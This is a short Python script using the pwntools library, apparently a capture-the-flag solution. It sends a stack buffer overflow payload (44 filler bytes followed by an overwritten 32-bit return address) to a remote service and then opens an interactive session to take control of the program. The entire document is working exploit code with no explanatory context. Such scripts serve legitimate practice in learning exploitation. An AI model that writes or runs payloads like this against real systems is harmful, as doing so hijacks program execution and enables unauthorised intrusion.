from pwn import *

context.log_level = "debug"

payload = "A" * 44
payload += p32(0x080487CD)

p = remote("ubuntu32.goatskin.kr",7878)
p.recvuntil("\n")
p.send(payload)

p.interactive()
